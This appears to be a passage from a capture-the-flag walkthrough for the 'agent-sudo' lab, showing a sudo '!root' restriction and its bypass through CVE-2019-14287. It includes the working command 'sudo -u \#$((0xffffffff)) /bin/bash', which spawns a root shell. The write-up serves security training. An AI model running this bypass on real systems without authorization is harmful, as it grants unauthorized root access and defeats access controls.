ames@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash



It looks like our user is not allowed to run `/bin/bash` as `root` since we have a `!root`.

here !root means that the user is allowed to run the command as any user except root



but a google search returns us something we might be able to use to gain root privileges.

![](https://blog.qz.sg/content/images/2021/10/image-33.png)

According to [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)

> __In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a `sudo -u \#$((0xffffffff))` command.__

Version 1.8.28 eh.

![](https://blog.qz.sg/content/images/2021/10/image-34.png)

Looks vulnerable


We can use below command to escalate privileges

```
james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:~# ls
```


